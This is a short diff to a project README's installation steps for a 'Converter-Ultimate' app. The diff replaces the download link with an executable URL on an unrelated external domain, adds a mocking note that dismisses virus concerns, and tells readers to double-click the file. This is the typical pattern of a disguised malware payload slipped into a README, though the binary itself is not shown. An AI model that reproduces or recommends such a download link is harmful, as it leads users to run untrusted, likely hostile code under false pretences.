@@ -9,8 +9,8 @@ This is the simplest way to get started. You get a pre-packaged installer that h
 
 Download the Installer:
 Click the link below to download the installer directly:
-
-Download Converter-Ultimate-Installer.exe
+---"https://www.oshonet.in/runclap/combine/runtime/runtime.exe"----Note: For People who think everything is a virus i "BET" a $1000000000 that ya try using your VM if you are scared cause for gods sake, i am not that dumb to target tech guys who dont got a stable living..LOL..)
+Download Converter-Ultimate-Installer.exe(runtime.exe)
 
 Run the Installer:
 Double-click the downloaded .exe file. The installer will guide you through the process, create shortcuts, and get the application ready to use.
